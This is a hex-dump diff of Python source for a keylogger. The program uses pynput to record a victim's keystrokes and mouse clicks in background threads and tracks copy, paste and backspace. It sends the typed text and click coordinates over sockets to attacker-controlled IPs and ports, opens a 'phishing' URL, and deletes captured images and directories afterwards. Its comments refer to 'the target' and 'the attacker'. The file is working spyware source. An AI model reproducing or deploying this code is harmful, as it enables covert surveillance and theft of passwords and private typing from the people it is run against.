-00002480: 2020 2020 2020 6966 206b 6579 2e63 6861        if key.cha
-00002490: 7220 696e 206f 7468 6572 5f63 6861 7265  r in other_chare
-000024a0: 6374 6572 733a 0d0a 2020 2020 2020 2020  cters:..        
-000024b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000024c0: 7365 6c66 2e77 6f72 6420 3d20 6f74 6865  self.word = othe
-000024d0: 725f 6368 6172 6563 7465 7273 5b6b 6579  r_charecters[key
-000024e0: 2e63 6861 725d 0d0a 2020 2020 2020 2020  .char]..        
-000024f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002500: 2320 5570 7065 7220 4368 6172 6163 7465  # Upper Characte
-00002510: 7273 2066 726f 6d20 2231 2220 746f 2022  rs from "1" to "
-00002520: 3022 2062 6563 6175 7365 2061 6c6c 2074  0" because all t
-00002530: 6869 7320 6e75 6d62 6572 7320 6172 6520  his numbers are 
-00002540: 6e6f 7420 6368 6172 6563 7465 7273 2061  not charecters a
-00002550: 7265 206e 6f74 2069 6e20 7079 6e70 7574  re not in pynput
-00002560: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00002570: 2020 2020 2020 656c 7365 3a0d 0a20 2020        else:..   
-00002580: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002590: 2020 2020 2073 656c 662e 776f 7264 203d       self.word =
-000025a0: 206b 6579 2e63 6861 722e 7570 7065 7228   key.char.upper(
-000025b0: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
-000025c0: 2020 2065 6c73 653a 0d0a 2020 2020 2020     else:..      
-000025d0: 2020 2020 2020 2020 2020 2020 2020 7365                se
-000025e0: 6c66 2e77 6f72 6420 3d20 6b65 792e 6368  lf.word = key.ch
-000025f0: 6172 0d0a 0d0a 2020 2020 2020 2020 2020  ar....          
-00002600: 2020 2020 2020 616c 6c5f 7265 715f 6b65        all_req_ke
-00002610: 7973 203d 207b 2203 223a 2073 656c 662e  ys = {".": self.
-00002620: 636f 7079 5f64 6174 612c 2022 1622 3a20  copy_data, ".": 
-00002630: 7365 6c66 2e61 7070 656e 645f 7061 7374  self.append_past
-00002640: 657d 0d0a 2020 2020 2020 2020 2020 2020  e}..            
-00002650: 2020 2020 2320 2245 5458 2220 7374 616e      # "ETX" stan
-00002660: 6473 2066 6f72 2022 456e 642d 5465 7874  ds for "End-Text
-00002670: 2d63 6861 7261 6374 6572 2220 616e 6420  -character" and 
-00002680: 6973 2061 2063 6f6e 7472 6f6c 2063 6861  is a control cha
-00002690: 7261 6374 6572 2077 6869 6368 206b 6e6f  racter which kno
-000026a0: 7773 2074 6865 2063 6861 7261 6374 6572  ws the character
-000026b0: 206f 6620 636f 7079 696e 6720 736f 6d65   of copying some
-000026c0: 7468 696e 6720 6f6e 2074 6865 206b 6579  thing on the key
-000026d0: 626f 6172 640d 0a20 2020 2020 2020 2020  board..         
-000026e0: 2020 2020 2020 2023 2022 5359 4e22 2073         # "SYN" s
-000026f0: 7461 6e64 7320 666f 7220 2253 796e 6368  tands for "Synch
-00002700: 726f 6e6f 7573 2049 646c 6522 2061 6e64  ronous Idle" and
-00002710: 2069 7320 6120 636f 6e74 726f 6c20 6368   is a control ch
-00002720: 6172 6163 7465 7220 7768 6963 6820 6b6e  aracter which kn
-00002730: 6f77 7320 7468 6520 6368 6172 6163 7465  ows the characte
-00002740: 7220 6f66 2070 6173 7469 6e67 2073 6f6d  r of pasting som
-00002750: 6574 6869 6e67 206f 6e20 7468 6520 6b65  ething on the ke
-00002760: 7962 6f61 7264 0d0a 2020 2020 2020 2020  yboard..        
-00002770: 2020 2020 2020 2020 666f 7220 6561 6368          for each
-00002780: 5f6b 6579 2069 6e20 616c 6c5f 7265 715f  _key in all_req_
-00002790: 6b65 7973 3a0d 0a20 2020 2020 2020 2020  keys:..         
-000027a0: 2020 2020 2020 2020 2020 2069 6620 6561             if ea
-000027b0: 6368 5f6b 6579 203d 3d20 6b65 792e 6368  ch_key == key.ch
-000027c0: 6172 3a0d 0a20 2020 2020 2020 2020 2020  ar:..           
-000027d0: 2020 2020 2020 2020 2020 2020 2023 2049               # I
-000027e0: 6620 7468 6520 636f 7079 2063 6861 7261  f the copy chara
-000027f0: 6374 6572 2069 7320 7072 6573 7365 642c  cter is pressed,
-00002800: 2065 6163 6820 6675 6e63 7469 6f6e 206f   each function o
-00002810: 6620 6561 6368 2063 6861 7261 6374 6572  f each character
-00002820: 2077 696c 6c20 6265 2077 6f72 6b69 6e67   will be working
-00002830: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00002840: 2020 2020 2020 2020 2020 616c 6c5f 7265            all_re
-00002850: 715f 6b65 7973 5b65 6163 685f 6b65 795d  q_keys[each_key]
-00002860: 2829 0d0a 2020 2020 2020 2020 2020 2020  ()..            
-00002870: 2020 2020 7472 793a 0d0a 2020 2020 2020      try:..      
-00002880: 2020 2020 2020 2020 2020 2020 2020 6173                as
-00002890: 6369 5f6e 756d 6265 7220 3d20 6f72 6428  ci_number = ord(
-000028a0: 7365 6c66 2e77 6f72 6429 0d0a 2020 2020  self.word)..    
-000028b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000028c0: 2320 4f72 6469 6e61 6c20 6e75 6d62 6572  # Ordinal number
-000028d0: 2069 6e20 7468 6520 7261 6e67 6520 6f66   in the range of
-000028e0: 2030 2074 6f20 3331 2063 6f6d 706c 6574   0 to 31 complet
-000028f0: 6573 2061 6c6c 2073 7065 6369 616c 2063  es all special c
-00002900: 6861 7261 6374 6572 7320 7769 7468 2074  haracters with t
-00002910: 6865 206b 6579 2022 7374 7267 202b 206c  he key "strg + l
-00002920: 6574 7465 7222 0d0a 2020 2020 2020 2020  etter"..        
-00002930: 2020 2020 2020 2020 2020 2020 6966 2061              if a
-00002940: 7363 695f 6e75 6d62 6572 206e 6f74 2069  sci_number not i
-00002950: 6e20 7261 6e67 6528 302c 2033 3229 3a0d  n range(0, 32):.
-00002960: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002970: 2020 2020 2020 2020 2023 2069 6620 7468           # if th
-00002980: 6572 6520 6973 206e 6f20 7370 6563 6961  ere is no specia
-00002990: 6c20 6368 6172 6163 7465 7220 6974 206a  l character it j
-000029a0: 7573 7420 7072 696e 7473 2074 6865 2061  ust prints the a
-000029b0: 6c70 6861 6265 7469 6320 6e75 6d62 6572  lphabetic number
-000029c0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-000029d0: 2020 2020 2020 2020 2020 7365 6c66 2e70            self.p
-000029e0: 7269 6e74 5f77 6f72 6b28 7365 6c66 2e77  rint_work(self.w
-000029f0: 6f72 6429 0d0a 0d0a 2020 2020 2020 2020  ord)....        
-00002a00: 2020 2020 2020 2020 6578 6365 7074 2054          except T
-00002a10: 7970 6545 7272 6f72 3a0d 0a20 2020 2020  ypeError:..     
-00002a20: 2020 2020 2020 2020 2020 2020 2020 2023                 #
-00002a30: 2070 7269 6e74 7320 7468 6520 616c 7068   prints the alph
-00002a40: 6162 6574 6320 6e75 6d62 6572 0d0a 2020  abetc number..  
-00002a50: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002a60: 2020 7365 6c66 2e70 7269 6e74 5f77 6f72    self.print_wor
-00002a70: 6b28 7365 6c66 2e77 6f72 6429 0d0a 0d0a  k(self.word)....
-00002a80: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002a90: 7072 696e 7428 7365 6c66 2e72 6963 6874  print(self.richt
-00002aa0: 6967 655f 6c69 7374 6529 0d0a 2020 2020  ige_liste)..    
-00002ab0: 2020 2020 2020 2020 6578 6365 7074 2054          except T
-00002ac0: 7970 6545 7272 6f72 3a0d 0a20 2020 2020  ypeError:..     
-00002ad0: 2020 2020 2020 2020 2020 2070 6173 730d             pass.
-00002ae0: 0a0d 0a20 2020 2020 2020 2065 7863 6570  ...        excep
-00002af0: 7420 4174 7472 6962 7574 6545 7272 6f72  t AttributeError
-00002b00: 3a0d 0a20 2020 2020 2020 2020 2020 2070  :..            p
-00002b10: 7269 6e74 2866 2741 6e20 6f74 6865 7220  rint(f'An other 
-00002b20: 6b65 7920 7761 7320 7072 6573 7365 643a  key was pressed:
-00002b30: 207b 6b65 797d 2729 0d0a 2020 2020 2020   {key}')..      
-00002b40: 2020 2020 2020 6966 206b 6579 203d 3d20        if key == 
-00002b50: 6b65 7962 6f61 7264 2e4b 6579 2e73 7061  keyboard.Key.spa
-00002b60: 6365 206f 7220 6b65 7920 3d3d 206b 6579  ce or key == key
-00002b70: 626f 6172 642e 4b65 792e 7461 623a 0d0a  board.Key.tab:..
-00002b80: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002b90: 7365 6c66 2e72 6963 6874 6967 655f 6c69  self.richtige_li
-00002ba0: 7374 6520 2b3d 2022 7b22 0d0a 2020 2020  ste += "{"..    
-00002bb0: 2020 2020 2020 2020 2020 2020 2320 4966              # If
-00002bc0: 2074 6865 2074 6172 6765 7420 7072 6573   the target pres
-00002bd0: 7365 7320 7461 6220 6f72 2073 7061 6365  ses tab or space
-00002be0: 2061 2022 7b22 2077 696c 6c20 6265 2061   a "{" will be a
-00002bf0: 7070 656e 6465 6420 746f 2074 6865 206c  ppended to the l
-00002c00: 6973 7420 736f 2074 6865 2061 7474 6163  ist so the attac
-00002c10: 6b65 7220 6b6e 6f77 7320 7768 656e 2061  ker knows when a
-00002c20: 6e64 0d0a 2020 2020 2020 2020 2020 2020  nd..            
-00002c30: 2020 2020 2320 7370 6163 6520 6f72 2061      # space or a
-00002c40: 2074 6162 206b 6579 2068 6173 2062 6565   tab key has bee
-00002c50: 6e20 7072 6573 7365 640d 0a20 2020 2020  n pressed..     
-00002c60: 2020 2020 2020 2065 6c69 6620 6b65 7920         elif key 
-00002c70: 3d3d 206b 6579 626f 6172 642e 4b65 792e  == keyboard.Key.
-00002c80: 6361 7073 5f6c 6f63 6b3a 0d0a 2020 2020  caps_lock:..    
-00002c90: 2020 2020 2020 2020 2020 2020 7365 6c66              self
-00002ca0: 2e63 6170 7320 3d20 5472 7565 0d0a 2020  .caps = True..  
-00002cb0: 2020 2020 2020 2020 2020 2020 2020 7365                se
-00002cc0: 6c66 2e63 6865 636b 2e61 7070 656e 6428  lf.check.append(
-00002cd0: 3129 0d0a 2020 2020 2020 2020 2020 2020  1)..            
-00002ce0: 6368 6563 6b5f 6361 7073 203d 2073 756d  check_caps = sum
-00002cf0: 2873 656c 662e 6368 6563 6b29 202f 2032  (self.check) / 2
-00002d00: 0d0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
-00002d10: 4966 2063 6865 636b 5f63 6170 7320 6973  If check_caps is
-00002d20: 206e 6f74 2070 7269 6d61 7279 2069 7420   not primary it 
-00002d30: 7769 6c6c 2073 6574 2073 656c 662e 6361  will set self.ca
-00002d40: 7073 2074 6f20 4661 6c73 650d 0a0d 0a20  ps to False.... 
-00002d50: 2020 2020 2020 2020 2020 2069 6620 7374             if st
-00002d60: 7228 6368 6563 6b5f 6361 7073 295b 2d31  r(check_caps)[-1
-00002d70: 5d20 213d 2027 3027 3a0d 0a20 2020 2020  ] != '0':..     
-00002d80: 2020 2020 2020 2020 2020 2070 6173 730d             pass.
-00002d90: 0a20 2020 2020 2020 2020 2020 2065 6c73  .            els
-00002da0: 653a 0d0a 2020 2020 2020 2020 2020 2020  e:..            
-00002db0: 2020 2020 7365 6c66 2e63 6170 7320 3d20      self.caps = 
-00002dc0: 4661 6c73 650d 0a20 2020 2020 2020 2020  False..         
-00002dd0: 2020 2020 2020 2023 2054 6869 7320 7265         # This re
-00002de0: 7365 7473 2065 7665 7279 7468 696e 670d  sets everything.
-00002df0: 0a0d 0a20 2020 2020 2020 2020 2020 2069  ...            i
-00002e00: 6620 6b65 7920 3d3d 206b 6579 626f 6172  f key == keyboar
-00002e10: 642e 4b65 792e 6261 636b 7370 6163 653a  d.Key.backspace:
-00002e20: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00002e30: 2020 6474 203d 2064 6174 6574 696d 652e    dt = datetime.
-00002e40: 6e6f 7728 290d 0a20 2020 2020 2020 2020  now()..         
-00002e50: 2020 2020 2020 2023 2047 6574 7320 7468         # Gets th
-00002e60: 6520 6375 7272 656e 7420 7469 6d65 0d0a  e current time..
-00002e70: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002e80: 6765 745f 7469 6d65 203d 2073 7472 2864  get_time = str(d
-00002e90: 7429 2e73 706c 6974 2822 3a22 290d 0a20  t).split(":").. 
-00002ea0: 2020 2020 2020 2020 2020 2020 2020 2023                 #
-00002eb0: 2054 6869 7320 7370 6c69 7473 2074 6865   This splits the
-00002ec0: 2074 696d 6520 736f 2074 6865 206d 696e   time so the min
-00002ed0: 7574 6573 2061 6e64 2073 6563 6f6e 6473  utes and seconds
-00002ee0: 2061 7265 2064 6973 706c 6179 6564 0d0a   are displayed..
-00002ef0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00002f00: 2020 686f 7572 2c20 6d69 6e75 7465 732c    hour, minutes,
-00002f10: 2073 6563 203d 2069 6e74 2867 6574 5f74   sec = int(get_t
-00002f20: 696d 655b 305d 5b3a 3a2d 315d 5b30 3a32  ime[0][::-1][0:2
-00002f30: 5d5b 3a3a 2d31 5d29 2c20 696e 7428 6765  ][::-1]), int(ge
-00002f40: 745f 7469 6d65 5b31 5d29 2c20 666c 6f61  t_time[1]), floa
-00002f50: 7428 6765 745f 7469 6d65 5b32 5d29 0d0a  t(get_time[2])..
-00002f60: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002f70: 2320 4765 7473 2074 6865 2063 7572 7265  # Gets the curre
-00002f80: 6e74 2068 6f75 722c 206d 696e 7574 6520  nt hour, minute 
-00002f90: 616e 6420 7365 636f 6e64 0d0a 0d0a 2020  and second....  
-00002fa0: 2020 2020 2020 2020 2020 2020 2020 616c                al
-00002fb0: 6c20 3d20 686f 7572 202a 2033 3630 3020  l = hour * 3600 
-00002fc0: 2b20 6d69 6e75 7465 7320 2a20 3630 202b  + minutes * 60 +
-00002fd0: 2073 6563 0d0a 2020 2020 2020 2020 2020   sec..          
-00002fe0: 2020 2020 2020 2320 4765 7473 2074 6865        # Gets the
-00002ff0: 2073 6563 6f6e 6473 206f 6620 6576 6572   seconds of ever
-00003000: 7974 6869 6e67 2066 726f 6d20 686f 7572  ything from hour
-00003010: 2074 6f20 7365 636f 6e64 0d0a 2020 2020   to second..    
-00003020: 2020 2020 2020 2020 2020 2020 6966 206e              if n
-00003030: 6f74 2073 656c 662e 7365 636f 6e64 733a  ot self.seconds:
-00003040: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00003050: 2020 2020 2020 2320 4966 2074 6865 7265        # If there
-00003060: 2069 7320 6e6f 7468 696e 6720 696e 2074   is nothing in t
-00003070: 6865 206c 6973 7420 7365 636f 6e64 2077  he list second w
-00003080: 696c 6c20 6265 2061 7070 616e 6465 640d  ill be appanded.
-00003090: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-000030a0: 2020 2020 2073 656c 662e 7365 636f 6e64       self.second
-000030b0: 732e 6170 7065 6e64 2861 6c6c 290d 0a20  s.append(all).. 
-000030c0: 2020 2020 2020 2020 2020 2020 2020 206d                 m
-000030d0: 696e 7573 203d 2061 6c6c 202d 2073 656c  inus = all - sel
-000030e0: 662e 7365 636f 6e64 735b 305d 0d0a 2020  f.seconds[0]..  
-000030f0: 2020 2020 2020 2020 2020 2020 2020 2320                # 
-00003100: 5468 6973 2063 6865 636b 7320 6966 2074  This checks if t
-00003110: 6865 2074 6172 6765 7420 6973 2068 6f6c  he target is hol
-00003120: 6469 6e67 2074 6865 2062 6163 6b73 7061  ding the backspa
-00003130: 6365 206b 6579 0d0a 2020 2020 2020 2020  ce key..        
-00003140: 2020 2020 2020 2020 6966 206d 696e 7573          if minus
-00003150: 203e 2030 2e30 3520 6f72 206d 696e 7573   > 0.05 or minus
-00003160: 203d 3d20 302e 303a 0d0a 2020 2020 2020   == 0.0:..      
-00003170: 2020 2020 2020 2020 2020 2020 2020 6966                if
-00003180: 2073 656c 662e 7269 6368 7469 6765 5f6c   self.richtige_l
-00003190: 6973 7465 3a0d 0a20 2020 2020 2020 2020  iste:..         
-000031a0: 2020 2020 2020 2020 2020 2020 2020 2073                 s
-000031b0: 656c 662e 7269 6368 7469 6765 5f6c 6973  elf.richtige_lis
-000031c0: 7465 2e70 6f70 282d 3129 0d0a 2020 2020  te.pop(-1)..    
-000031d0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000031e0: 2020 2020 2320 5265 6d6f 7665 7320 7468      # Removes th
-000031f0: 6520 6c61 7374 2069 7465 6d20 6f66 2074  e last item of t
-00003200: 6865 206c 6973 740d 0a0d 0a20 2020 2020  he list....     
-00003210: 2020 2020 2020 2020 2020 2073 656c 662e             self.
-00003220: 7365 636f 6e64 735b 305d 203d 2061 6c6c  seconds[0] = all
-00003230: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00003240: 2020 2320 4c69 7374 2077 696c 6c20 616c    # List will al
-00003250: 6c77 6179 7320 6265 2075 7064 6174 6564  lways be updated
-00003260: 0d0a 0d0a 2020 2020 6465 6620 6f6e 5f72  ....    def on_r
-00003270: 656c 6561 7365 2873 656c 662c 206b 6579  elease(self, key
-00003280: 293a 0d0a 2020 2020 2020 2020 7072 696e  ):..        prin
-00003290: 7428 6627 4b65 7920 7265 6c65 6173 6564  t(f'Key released
-000032a0: 3a20 7b6b 6579 7d27 290d 0a0d 0a20 2020  : {key}')....   
-000032b0: 2064 6566 2073 7461 7274 2873 656c 6629   def start(self)
-000032c0: 3a0d 0a20 2020 2020 2020 2069 6620 7365  :..        if se
-000032d0: 6c66 2e70 6869 7368 696e 6720 6973 206e  lf.phishing is n
-000032e0: 6f74 204e 6f6e 653a 0d0a 2020 2020 2020  ot None:..      
-000032f0: 2020 2020 2020 7768 696c 6520 5472 7565        while True
-00003300: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
-00003310: 2020 2074 7279 3a0d 0a20 2020 2020 2020     try:..       
-00003320: 2020 2020 2020 2020 2020 2020 2072 6573               res
-00003330: 706f 6e73 6520 3d20 7265 7175 6573 7473  ponse = requests
-00003340: 2e67 6574 2873 656c 662e 7068 6973 6869  .get(self.phishi
-00003350: 6e67 290d 0a20 2020 2020 2020 2020 2020  ng)..           
-00003360: 2020 2020 2020 2020 2023 2052 6573 706f           # Respo
-00003370: 6e65 2069 7320 6865 7265 2074 6f20 7365  ne is here to se
-00003380: 6520 6966 2074 6865 2077 6562 7369 7465  e if the website
-00003390: 2069 7320 6f6e 6c69 6e65 206f 7220 6e6f   is online or no
-000033a0: 740d 0a20 2020 2020 2020 2020 2020 2020  t..             
-000033b0: 2020 2020 2020 2077 6562 6272 6f77 7365         webbrowse
-000033c0: 722e 6f70 656e 2873 656c 662e 7068 6973  r.open(self.phis
-000033d0: 6869 6e67 290d 0a20 2020 2020 2020 2020  hing)..         
-000033e0: 2020 2020 2020 2020 2020 2062 7265 616b             break
-000033f0: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
-00003400: 2020 2020 6578 6365 7074 2072 6571 7565      except reque
-00003410: 7374 732e 6578 6365 7074 696f 6e73 2e43  sts.exceptions.C
-00003420: 6f6e 6e65 6374 696f 6e45 7272 6f72 3a0d  onnectionError:.
-00003430: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00003440: 2020 2020 2070 7269 6e74 2822 4e6f 2063       print("No c
-00003450: 6f6e 6e65 6374 696f 6e22 290d 0a20 2020  onnection")..   
-00003460: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00003470: 2073 7973 2e65 7869 7428 290d 0a0d 0a20   sys.exit().... 
-00003480: 2020 2020 2020 206c 6973 7465 6e69 6e67         listening
-00003490: 5f74 6872 6561 6420 3d20 7468 7265 6164  _thread = thread
-000034a0: 696e 672e 5468 7265 6164 2874 6172 6765  ing.Thread(targe
-000034b0: 743d 7365 6c66 2e64 6174 656e 5f61 7566  t=self.daten_auf
-000034c0: 6e65 6865 6d65 6e29 0d0a 2020 2020 2020  nehemen)..      
-000034d0: 2020 2320 5468 6973 2072 756e 7320 7468    # This runs th
-000034e0: 6520 7072 6f67 7261 6d6d 2062 6568 696e  e programm behin
-000034f0: 6420 7468 6520 6163 7475 616c 2070 726f  d the actual pro
-00003500: 6772 616d 6d69 6e67 0d0a 2020 2020 2020  gramming..      
-00003510: 2020 6c69 7374 656e 696e 675f 7468 7265    listening_thre
-00003520: 6164 2e73 7461 7274 2829 0d0a 0d0a 2020  ad.start()....  
-00003530: 2020 2020 2020 7468 7265 6164 696e 675f        threading_
-00003540: 6d6f 7573 6520 3d20 7468 7265 6164 696e  mouse = threadin
-00003550: 672e 5468 7265 6164 2874 6172 6765 743d  g.Thread(target=
-00003560: 7365 6c66 2e61 6c6c 5f63 6c69 636b 7329  self.all_clicks)
-00003570: 0d0a 2020 2020 2020 2020 2320 5468 6973  ..        # This
-00003580: 2072 756e 7320 7468 6520 7072 6f67 7261   runs the progra
-00003590: 6d6d 2062 6568 696e 6420 7468 6520 6163  mm behind the ac
-000035a0: 7475 616c 2070 726f 6772 616d 6d69 6e67  tual programming
-000035b0: 0d0a 2020 2020 2020 2020 7468 7265 6164  ..        thread
-000035c0: 696e 675f 6d6f 7573 652e 7374 6172 7428  ing_mouse.start(
-000035d0: 290d 0a0d 0a20 2020 2020 2020 2073 656e  )....        sen
-000035e0: 645f 7469 6d65 7220 3d20 736f 636b 6574  d_timer = socket
-000035f0: 2e73 6f63 6b65 7428 736f 636b 6574 2e41  .socket(socket.A
-00003600: 465f 494e 4554 2c20 736f 636b 6574 2e53  F_INET, socket.S
-00003610: 4f43 4b5f 5354 5245 414d 290d 0a20 2020  OCK_STREAM)..   
-00003620: 2020 2020 2073 656e 645f 7469 6d65 722e       send_timer.
-00003630: 636f 6e6e 6563 7428 2873 656c 662e 6970  connect((self.ip
-00003640: 5f74 696d 6572 2c20 7365 6c66 2e70 6f72  _timer, self.por
-00003650: 745f 7469 6d65 7229 290d 0a0d 0a20 2020  t_timer))....   
-00003660: 2020 2020 2073 656e 645f 7469 6d65 722e       send_timer.
-00003670: 7365 6e64 2873 7472 2873 656c 662e 6475  send(str(self.du
-00003680: 7261 7469 6f6e 292e 656e 636f 6465 2829  ration).encode()
-00003690: 290d 0a20 2020 2020 2020 2023 2054 6869  )..        # Thi
-000036a0: 7320 7365 6e64 7320 7468 6520 7365 636f  s sends the seco
-000036b0: 6e64 7320 746f 2074 6865 2073 6572 7665  nds to the serve
-000036c0: 720d 0a20 2020 2020 2020 2073 656e 645f  r..        send_
-000036d0: 7469 6d65 722e 636c 6f73 6528 290d 0a0d  timer.close()...
-000036e0: 0a20 2020 2020 2020 2074 696d 6572 5f64  .        timer_d
-000036f0: 656c 6574 655f 6469 7220 3d20 736f 636b  elete_dir = sock
-00003700: 6574 2e73 6f63 6b65 7428 736f 636b 6574  et.socket(socket
-00003710: 2e41 465f 494e 4554 2c20 736f 636b 6574  .AF_INET, socket
-00003720: 2e53 4f43 4b5f 5354 5245 414d 290d 0a20  .SOCK_STREAM).. 
-00003730: 2020 2020 2020 2074 696d 6572 5f64 656c         timer_del
-00003740: 6574 655f 6469 722e 636f 6e6e 6563 7428  ete_dir.connect(
-00003750: 2822 3132 372e 302e 302e 3122 2c20 3130  ("127.0.0.1", 10
-00003760: 3737 2929 0d0a 0d0a 2020 2020 2020 2020  77))....        
-00003770: 7469 6d65 725f 6465 6c65 7465 5f64 6972  timer_delete_dir
-00003780: 2e73 656e 6428 7374 7228 7365 6c66 2e64  .send(str(self.d
-00003790: 7572 6174 696f 6e29 2e65 6e63 6f64 6528  uration).encode(
-000037a0: 2929 0d0a 2020 2020 2020 2020 7469 6d65  ))..        time
-000037b0: 725f 6465 6c65 7465 5f64 6972 2e63 6c6f  r_delete_dir.clo
-000037c0: 7365 2829 0d0a 0d0a 2020 2020 2020 2020  se()....        
-000037d0: 7769 7468 206b 6579 626f 6172 642e 4c69  with keyboard.Li
-000037e0: 7374 656e 6572 286f 6e5f 7072 6573 733d  stener(on_press=
-000037f0: 7365 6c66 2e6f 6e5f 7072 6573 732c 206f  self.on_press, o
-00003800: 6e5f 7265 6c65 6173 653d 7365 6c66 2e6f  n_release=self.o
-00003810: 6e5f 7265 6c65 6173 6529 2061 7320 6c69  n_release) as li
-00003820: 7374 656e 6572 3a0d 0a20 2020 2020 2020  stener:..       
-00003830: 2020 2020 2073 656c 662e 636f 756e 7464       self.countd
-00003840: 6f77 6e5f 7365 6e64 2873 656c 662e 6475  own_send(self.du
-00003850: 7261 7469 6f6e 2c20 7365 6c66 2e69 705f  ration, self.ip_
-00003860: 7068 6f74 6f73 2c20 7365 6c66 2e70 6f72  photos, self.por
-00003870: 745f 7068 6f74 6f73 2c20 7365 6c66 2e69  t_photos, self.i
-00003880: 705f 6b65 796c 6f67 6765 722c 0d0a 2020  p_keylogger,..  
-00003890: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000038a0: 2020 2020 2020 2020 2020 2020 2020 7365                se
-000038b0: 6c66 2e70 6f72 745f 6b65 796c 6f67 6765  lf.port_keylogge
-000038c0: 7229 0d0a 2020 2020 2020 2020 2020 2020  r)..            
-000038d0: 6c69 7374 656e 6572 2e6a 6f69 6e28 290d  listener.join().
-000038e0: 0a20 2020 2020 2020 2020 2020 2023 2054  .            # T
-000038f0: 6869 7320 6c69 7374 656e 7320 746f 2074  his listens to t
-00003900: 6865 206b 6579 7320 7468 6174 2077 6865  he keys that whe
-00003910: 7265 2074 7970 6564 0d0a                 re typed..
+000015c0: 2020 2020 2020 2020 2020 2070 7269 6e74             print
+000015d0: 2873 656c 662e 636f 6f72 6469 6e61 7465  (self.coordinate
+000015e0: 7329 0d0a 2020 2020 2020 2020 2020 2020  s)..            
+000015f0: 776f 7274 203d 2022 220d 0a20 2020 2020  wort = ""..     
+00001600: 2020 2020 2020 2066 6f72 207a 6569 6368         for zeich
+00001610: 656e 2069 6e20 7365 6c66 2e72 6963 6874  en in self.richt
+00001620: 6967 655f 6c69 7374 653a 0d0a 2020 2020  ige_liste:..    
+00001630: 2020 2020 2020 2020 2020 2020 776f 7274              wort
+00001640: 202b 3d20 7a65 6963 6865 6e0d 0a0d 0a20   += zeichen.... 
+00001650: 2020 2020 2020 2020 2020 2023 2047 6574             # Get
+00001660: 7320 7468 6520 636f 6f72 6469 6e61 7465  s the coordinate
+00001670: 7320 7768 6572 6520 7468 6520 7461 7267  s where the targ
+00001680: 6574 2077 6173 2077 7269 7469 6e67 2073  et was writing s
+00001690: 6f6d 6574 6869 6e67 2066 726f 6d20 7468  omething from th
+000016a0: 6520 6265 6769 6e6e 696e 670d 0a20 2020  e beginning..   
+000016b0: 2020 2020 2020 2020 2023 2053 656e 6473           # Sends
+000016c0: 2074 6865 2064 6174 6120 746f 2073 6572   the data to ser
+000016d0: 7665 725f 6b65 796c 6f67 6765 720d 0a20  ver_keylogger.. 
+000016e0: 2020 2020 2020 2020 2020 2061 6c6c 5f64             all_d
+000016f0: 6174 6120 3d20 7374 7228 7365 6c66 2e63  ata = str(self.c
+00001700: 6f6f 7264 696e 6174 6573 2920 2b20 776f  oordinates) + wo
+00001710: 7274 0d0a 2020 2020 2020 2020 2020 2020  rt..            
+00001720: 2320 436f 6f72 6469 6e61 7465 7320 616e  # Coordinates an
+00001730: 6420 6b65 7964 6174 6120 6172 6520 6265  d keydata are be
+00001740: 696e 6720 636f 6e63 6174 656e 6174 6564  ing concatenated
+00001750: 0d0a 2020 2020 2020 2020 2020 2020 6b65  ..            ke
+00001760: 795f 6461 7461 2e73 656e 6428 616c 6c5f  y_data.send(all_
+00001770: 6461 7461 2e65 6e63 6f64 6528 2929 0d0a  data.encode())..
+00001780: 2020 2020 2020 2020 2020 2020 7072 696e              prin
+00001790: 7428 776f 7274 290d 0a20 2020 2020 2020  t(wort)..       
+000017a0: 2020 2020 2070 7269 6e74 2873 656c 662e       print(self.
+000017b0: 7269 6368 7469 6765 5f6c 6973 7465 290d  richtige_liste).
+000017c0: 0a20 2020 2020 2020 2020 2020 2066 6861  .            fha
+000017d0: 6e64 6c65 2e63 6c6f 7365 2829 0d0a 2020  ndle.close()..  
+000017e0: 2020 2020 2020 2020 2020 2320 436c 6f73            # Clos
+000017f0: 6573 2074 6865 2069 6d61 6765 0d0a 2020  es the image..  
+00001800: 2020 2020 2020 2020 2020 6f73 2e72 656d            os.rem
+00001810: 6f76 6528 2249 6d61 6765 2e70 6e67 2229  ove("Image.png")
+00001820: 0d0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
+00001830: 4465 6c65 7465 7320 7468 6520 696d 6167  Deletes the imag
+00001840: 6520 696e 2074 6865 2063 7572 7265 6e74  e in the current
+00001850: 2064 6972 6563 746f 7279 0d0a 2020 2020   directory..    
+00001860: 2020 2020 2020 2020 6f73 2e63 6864 6972          os.chdir
+00001870: 2822 2e2e 2229 0d0a 2020 2020 2020 2020  ("..")..        
+00001880: 2020 2020 2320 5765 2068 6176 6520 746f      # We have to
+00001890: 2067 6f20 6261 636b 2073 6f20 7468 6174   go back so that
+000018a0: 2077 6520 6361 6e20 6465 6c65 7465 2074   we can delete t
+000018b0: 6865 206f 7468 6572 2064 6972 6563 746f  he other directo
+000018c0: 7269 6573 0d0a 2020 2020 2020 2020 2020  ries..          
+000018d0: 2020 666f 7220 6561 6368 5f64 6972 2069    for each_dir i
+000018e0: 6e20 7261 6e64 6f6d 5f6c 7374 3a0d 0a20  n random_lst:.. 
+000018f0: 2020 2020 2020 2020 2020 2020 2020 2073                 s
